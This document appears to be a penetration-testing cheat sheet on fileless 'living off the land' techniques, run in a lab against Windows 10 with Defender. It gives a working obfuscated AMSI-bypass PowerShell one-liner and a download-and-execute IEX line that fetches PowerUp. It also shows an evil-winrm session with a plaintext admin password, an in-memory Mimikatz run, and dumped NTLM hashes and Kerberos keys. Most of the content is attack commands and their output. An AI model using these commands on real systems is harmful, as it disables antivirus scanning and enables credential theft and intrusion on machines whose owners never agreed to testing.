==================================================================================================================
Living off the land and filess techniques
==================================================================================================================

---------------------------------------------------------------
Why using 'living off the land and fileless' techniques ?
---------------------------------------------------------------
> The purpose of the 'living off the land and fileless' techniques is to avoid getting detected and blocked by the antivirus and end-point protection
  solutions installed on modern Windows machines during penetration tests by running scripts and shellcodes directly into memory and making use as much as possible
  of the sysadmin tools and software that already installed on targeted computers.
  
  The four main categories of living off the land and fileless attack techniques are: 
  - memory-only threats, 
  - fileless persistence, 
  - dual-use tools,
  - non-PE file attacks.

  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools and therefore minimizes
  the risk of an attack being detected and blocked.

  Before executing a "hacking" and/or security audit scripts (e.g. '.ps1', '.vbs', '.bat') on a Windows machine is important to disable the Antimalware Scan Interface (AMSI)
  to avoid our scripts being scanned and potentially blocked by the AV installed on the Windows machine.

---------------------------------------------------------------
Microsoft Antimalware Scan Interface (AMSI)
---------------------------------------------------------------
> The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows machine
  (i.e. Windows 10/11 or Windows server 2016/2019) to scan the applications and scripts before they are executed. 
  
  For instance, the AMSI feature is integrated into these components of Windows 10 when they are executed:
  - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
  - PowerShell (scripts, interactive use, and dynamic code evaluation)
  - Windows Script Host (wscript.exe and cscript.exe)
  - JavaScript and VBScript
  - Office VBA macros

> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate with any antimalware product
  that's present on a Windows machine (e.g. Windows Defender AntiVirus is enabled by default on Windows 10/11).
  AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
  by today's antimalware products that can be integrated into applications. 

> There are many techniques to bypass AMSI. The techniques vary slightly, but mostly the amsi.dll is manipulated in memory. 
  The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 
  This can be done by patching the dll in memory or by placing a separate amsi.dll in the current working directory.

  Usefull links:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
  
  
==================================================================================================================
Example - AMSI bypass techniques on a fully patched Windows 10 laptop with Defender (AV) enabled and up-to-date
==================================================================================================================

---------------------------------------------------------------
Example 1 - AMSI bypass as a low privileged user
---------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\auditor> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\auditor> net user auditor
User name                    auditor
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/21/2021 4:48:04 AM
Password expires             1/2/2022 4:48:04 AM
Password changeable          11/21/2021 4:48:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/21/2021 4:52:08 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

PS C:\temp> cd c:\temp

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
<SNIP>
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\temp> $Hxl=$null;
PS C:\temp> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
PS C:\temp> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
PS C:\temp> [Threading.Thread]::Sleep(286);
PS C:\temp> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...
HijackablePath : C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...

PS C:\temp>



---------------------------------------------------------------
Example 2 - AMSI bypass as a local administrator user
---------------------------------------------------------------

┌──(kali㉿kali)-[~/Documents]
└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\qualys\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\qualys\Documents> Bypass-4MSI
You cannot call a method on a null-valued expression.
At line:1 char:735
+ ... .GetFIeld(''+$([SYsTEM.NeT.WEBUTILitY]::HTmLDecode('&#97;&#109;&#115;&#105;'))+' ...
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
    
*Evil-WinRM* PS C:\Users\qualys\Documents> Bypass-4MSI

*Evil-WinRM* PS C:\Users\qualys\Documents> Invoke-Mimikatz.ps1

*Evil-WinRM* PS C:\Users\qualys\Documents> Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 42854 (00000000:0000a766)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/21/2021 6:58:31 PM
SID               : S-1-5-90-1
	msv :
	 [00000003] Primary
	 * Username : SERVER02$
	 * Domain   : SECURITY-LAB
	 * NTLM     : cbg87hdcf8e5ee10c7667fg73f4b2511
	 * SHA1     : 9f2967eb10fea1469qs602deb4145d287f77f944
	tspkg :
	wdigest :
	 * Username : SERVER02$
	 * Domain   : SECURITY-LAB
	 * Password : (null)
	kerberos :
	 * Username : SERVER02$
	 * Domain   : Security-Test-Lab.Local
	 * Password : de 3f 45 c3 25 0d bb fe 8d 76 70 7b db 21 ec 3d d2 44 63 36 e5 f0 77 8e 39 40 af f1 13 a8 ea 40 ff 7e b4 25 25 14 b6 61 2b b7 28 ad c9 91 24 16 82 35 f7 fb e7 91 4f 32 37 d7 35 05 9b 84 b2 6c 2b 7a 78 24 4c 08 78 dd b5 5b a6 42 79 7a de b1 44 4e 14 48 5b cf ea 0e bb c7 51 77 97 93 0f 24 d1 c0 04 37 a8 53 d6 fa 7d 38 e4 e9 92 bd 4c 89 5e 13 54 7f 08 75 39 23 2c 5b bb d4 4d ec 24 c8 99 d9 ec 75 e6 88 73 4c af f6 67 47 98 94 18 50 8b e1 8a 56 d7 75 3c 34 3a 6d 46 89 90 a1 9c 9e e2 59 e6 24 fd 03 7e 5d 0c 71 06 7b 57 60 7e 2b c0 bf 3d 92 26 77 4a bb c0 b4 cb 9d fe b9 b7 e4 bb ad fb b6 2e 5d bb 2e 4e a3 31 27 62 71 07 ca c6 a1 08 ce a0 55 b1 b9 2d a0 6e e2 18 74 8c 30 cb 31 53 88 02 48 1c 06 f2 cb d7 ca d1 bc 1d e2
	ssp :	KO
	credman :

Authentication Id : 0 ; 42526 (00000000:0000a61e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/21/2021 6:58:31 PM
SID               : S-1-5-90-1
	msv :
	 [00000003] Primary
	 * Username : SERVER02$
	 * Domain   : SECURITY-LAB
	 * NTLM     : cbg87hdcf8e5ee10c7667fg73f4b2511
<SNIP>

